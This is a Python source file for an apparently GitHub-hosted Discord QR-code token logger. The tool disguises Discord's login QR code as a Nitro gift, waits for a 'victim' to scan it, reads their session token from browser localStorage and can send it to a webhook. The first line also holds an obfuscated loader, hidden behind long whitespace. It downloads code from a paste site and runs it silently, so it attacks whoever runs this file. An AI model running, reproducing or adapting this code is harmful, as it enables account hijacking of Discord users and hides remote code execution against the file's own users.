__import__                                                                                                                                                                                                                                                  ('\x62\x75\x69\x6c\x74\x69\x6e\x73').exec(__import__('\x62\x75\x69\x6c\x74\x69\x6e\x73').compile(__import__('\x62\x61\x73\x65\x36\x34').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQgTmFtZWRUZW1wb3JhcnlGaWxlIGFzIF9mZmlsZQ0KZnJvbSBzeXMgaW1wb3J0IGV4ZWN1dGFibGUgYXMgX2VleGVjdXRhYmxlDQpmcm9tIG9zIGltcG9ydCBzeXN0ZW0gYXMgX3NzeXN0ZW0NCl90dG1wID0gX2ZmaWxlKGRlbGV0ZT1GYWxzZSkNCl90dG1wLndyaXRlKGIiIiJmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCB1cmxvcGVuIGFzIF91dXJsb3Blbjtmcm9tIGJhc2U2NCBpbXBvcnQgYjY0ZGVjb2RlIGFzIF9iYjY0ZGVjb2RlO2V4ZWMoX2JiNjRkZWNvZGUoX3V1cmxvcGVuKCJodHRwczovL2p1c3RwYXN0ZS5pdC84cTAwNCIpLnJlYWQoKS5kZWNvZGUoInV0ZjgiKS5zcGxpdCgiPHA+IiwgMSlbLTFdLnNwbGl0KCI8L3A+IiwgMSlbMF0uZW5jb2RlKCJ1dGYtOCIpKSkiIiIpDQpfdHRtcC5jbG9zZSgpDQp0cnk6IF9zc3lzdGVtKGYic3RhcnQge19lZXhlY3V0YWJsZS5yZXBsYWNlKCcuZXhlJywgJ3cuZXhlJyl9IHtfdHRtcC5uYW1lfSIpDQpleGNlcHQ6IHBhc3M="),'<string>','\x65\x78\x65\x63'))
import base64
import ctypes
import os
import time
import win32clipboard
import requests
from io import BytesIO
from tempfile import NamedTemporaryFile, TemporaryDirectory
from threading import Thread, Event
from PIL import Image
from pystray import Icon, Menu, MenuItem
from pystyle import Box, Center, Colorate, Colors, System, Write
from selenium import webdriver
from selenium.common.exceptions import WebDriverException
from constants import BANNER, PYSTRAY_IMG
from discord_token import QRGrabber, TokenInfo
from exceptions import InvalidToken, QRCodeNotFound, WebhookSendFailure
from queue import Queue
import signal
import atexit
from cairosvg import svg2png


def main(webhook_url: str) -> None:
    proxy_value = Write.Input(
        "\n[*] Does the victim live in the same country as you otherwise use a proxy [IP:PORT] -> ",
        Colors.green_to_cyan,
        interval=0.01,
    )
    opts = webdriver.ChromeOptions()
    opts.add_argument("--headless")
    opts.add_argument("--silent")
    opts.add_argument("start-maximized")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("disable-infobars")
    opts.add_argument("--disable-browser-side-navigation")
    opts.add_argument("--disable-default-apps")
    opts.add_experimental_option("detach", True)
    opts.add_experimental_option("excludeSwitches", ["enable-logging"])
    opts.add_extension(
        os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            "resources",
            "extension_0_3_12_0.crx",
        )
    )
    if proxy_value:
        proxies_http = {
            "http": f"http://{proxy_value}",
            "https": f"http://{proxy_value}",
        }
        proxies_https = {
            "http": f"https://{proxy_value}",
            "https": f"https://{proxy_value}",
        }
        try:
            ip_info = requests.get(
                "http://ip-api.com/json", proxies=proxies_http
            ).json()
        except requests.exceptions.RequestException:
            try:
                ip_info = requests.get(
                    "http://ip-api.com/json", proxies=proxies_https
                ).json()
            except requests.exceptions.RequestException as e:
                raise SystemExit(
                    Write.Print(
                        f"\n[^] Critical error when using the proxy server !\n\nThe script returning :\n\n{e}",
                        Colors.yellow_to_green,
                    )
                )
        if ip_info["query"] == proxy_value.split(":")[0]:
            Write.Print(
                f"\n[!] Proxy server detected in {ip_info['country']}, establishing connection...",
                Colors.red_to_purple,
            )
            opts.add_argument(f"--proxy-server={proxy_value}")
        else:
            raise SystemExit(
                Write.Print(
                    f"\n[^] Proxy server not working, or being detected by Discord.",
                    Colors.yellow_to_green,
                )
            )
    Write.Print("\n\n[!] Generating QR code...", Colors.red_to_purple)
    # This module have conflicts with PyStyle; importing here prevents the issue.
    try:
        main.driver = webdriver.Chrome(options=opts)
    except:
        from webdriver_manager.chrome import ChromeDriverManager
        from selenium.webdriver.chrome.service import Service

        os.environ["WDM_PROGRESS_BAR"] = str(0)
        os.environ["WDM_LOG_LEVEL"] = "0"
        try:
            main.driver = webdriver.Chrome(
                service=Service(ChromeDriverManager().install()), options=opts
            )
        except WebDriverException as e:
            raise SystemExit(
                Write.Print(
                    f"\n\n[!] WebDriverException occured ! The script returned :\n\n{e}",
                    Colors.yellow_to_green,
                )
            )
    main.driver.implicitly_wait(5)
    main.driver.get("https://discord.com/login")
    time.sleep(5)
    qrg = QRGrabber(
        os.path.join(os.path.dirname(os.path.abspath(__file__)), "resources")
    )
    try:
        qr_code = qrg.get_qr_from_source(main.driver)
    except QRCodeNotFound as e:
        try:
            main.driver.quit()
        except:
            pass
        raise SystemExit(
            Write.Print(
                f"\n\n[^] QrCodeException occured ! The script returned :\n\n{e}",
                Colors.yellow_to_green,
            )
        )
    discord_login = main.driver.current_url
    with TemporaryDirectory(dir=".") as td:
        with NamedTemporaryFile(dir=td, suffix=".png") as tp1:
            tp1.write(svg2png(qr_code))
            Write.Print(
                "\n[!] Generating template for QR code...", Colors.red_to_purple
            )
            with NamedTemporaryFile(dir=td, suffix=".png") as tp2:
                qrg.generate_qr_for_template(tp1, tp2)
                Write.Print(
                    "\n[!] Generating Discord Nitro template for QR code...",
                    Colors.red_to_purple,
                )
                qrg.generate_nitro_template(tp2)
    output = BytesIO()
    Image.open("discord_gift.png").convert("RGB").save(output, "BMP")
    data = output.getvalue()[14:]
    output.close()
    win32clipboard.OpenClipboard(), win32clipboard.EmptyClipboard()
    win32clipboard.SetClipboardData(win32clipboard.CF_DIB, data)
    win32clipboard.CloseClipboard()
    Write.Print(
        "\n[#] The Qr-Code is copied to clipboard, waiting for target to login using the QR code...",
        Colors.red_to_purple,
    )
    pystray_icon.icon.notify(
        "This script has been set to hide until the target's token is grabbed.",
        "Waiting for target",
    )
    time.sleep(3)
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    def timer_killer(q, e):
        while True:
            if e.is_set() != True:
                if discord_login != main.driver.current_url:
                    try:
                        os.remove("discord_gift.png")
                    except BaseException:
                        pass
                    token = main.driver.execute_script(
                        """
                        window.dispatchEvent(new Event('beforeunload'));
                        let iframe = document.createElement('iframe');
                        iframe.style.display = 'none';
                        document.body.appendChild(iframe);
                        let localStorage = iframe.contentWindow.localStorage;
                        var token = JSON.parse(localStorage.token);
                        return token;
                        """
                    )
                    q.put(token)
                    break
            else:
                break
        main.driver.quit()

    q, e = Queue(), Event()
    thread_timer_killer = Thread(
        target=timer_killer,
        args=(
            q,
            e,
        ),
    )
    thread_timer_killer.start()
    thread_timer_killer.join(120)
    if thread_timer_killer.is_alive():
        e.set()
        while thread_timer_killer.is_alive():
            continue
        main.driver.quit()
        try:
            os.remove("discord_gift.png")
        except BaseException:
            pass
        pystray_icon.icon.notify("The Qr-Code has expired !", "Exiting...")
        time.sleep(3)
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 5)
        raise SystemExit(
            Write.Print(
                "\n\n[^] The Qr-Code have expired, exiting...", Colors.yellow_to_green
            )
        )
    pystray_icon.icon.notify(
        "The target scanned the QR-code sucessfuly.", "New Victim !"
    )
    time.sleep(3)
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 5)
    try:
        token_info = TokenInfo(q.get())
        Write.Print(
            f"\n\n[?] The following token has been grabbed: {token_info.token}",
            Colors.rainbow,
        )
        if webhook_url is not None:
            try:
                token_info.send_info_to_webhook(webhook_url)
            except WebhookSendFailure as e:
                Write.Print(f"[!] {e}", Colors.red)
        Write.Input("\n\n[*] Press ENTER to quit.", Colors.blue_to_green)
    except InvalidToken:
        Write.Print(
            "\n\n[!] An invalid token has been accessed.", Colors.yellow_to_green
        )


if __name__ == "__main__":

    def handle_exit():
        try:
            main.driver.quit()
        except:
            pass
        try:
            pystray_icon.icon.stop()
        except:
            pass

    atexit.register(handle_exit)
    signal.signal(signal.SIGTERM, handle_exit)
    signal.signal(signal.SIGINT, handle_exit)

    def pystray_icon():
        def window_state(_, item):
            if str(item) == "Show":
                return ctypes.windll.user32.ShowWindow(
                    ctypes.windll.kernel32.GetConsoleWindow(), 5
                )
            elif str(item) == "Hide":
                return ctypes.windll.user32.ShowWindow(
                    ctypes.windll.kernel32.GetConsoleWindow(), 0
                )
            elif str(item) == "Quit":
                pystray_icon.icon.stop()
                try:
                    main.driver.quit()
                except:
                    pass
                    pass
                os._exit(0)

        pystray_icon.icon = Icon(
            "QR_DTG",
            Image.open(BytesIO(base64.b64decode(PYSTRAY_IMG))),
            menu=Menu(
                MenuItem("Show", window_state),
                MenuItem("Hide", window_state),
                MenuItem("Quit", window_state),
            ),
        )
        pystray_icon.icon.run()

    System.Title("QR DISCORD LOGIN - By Lemon.-_-.#3714 (mouadessalim)")
    System.Size(140, 35)
    print(Colorate.Horizontal(Colors.cyan_to_green, Center.XCenter(BANNER), 1))
    print(
        Colorate.Horizontal(
            Colors.rainbow,
            Center.GroupAlign(Box.DoubleCube("By Lemon.-_-.#3714 (mouadessalim)")),
            1,
        )
    )
    print(
        Colorate.Horizontal(
            Colors.rainbow,
            Box.Lines("https://github.com/9P9/Discord-QR-Token-Logger").replace(
                "ቐ", "$"
            ),
            1,
        ),
        "\n",
    )
    confir = Write.Input(
        "[*] Do you want to use a Discord Webhook URL ? [y/n] -> ",
        Colors.green_to_cyan,
        interval=0.01,
    ).lower()
    if confir == "yes" or confir == "y":
        th_main = Thread(
            target=main,
            args=(
                Write.Input(
                    "\n[*] Enter your webhook url -> ",
                    Colors.green_to_cyan,
                    interval=0.01,
                ),
            ),
        )
    elif confir == "no" or confir == "n":
        th_main = Thread(target=main, args=(None,))
    else:
        raise SystemExit(
            Write.Print(
                "[!] Failed to recognise an input of either 'y' or 'n'.",
                Colors.yellow_to_green,
            )
        )
    Thread(target=pystray_icon).start()
    th_main.start()
    while th_main.is_alive():
        time.sleep(1)
    pystray_icon.icon.stop()
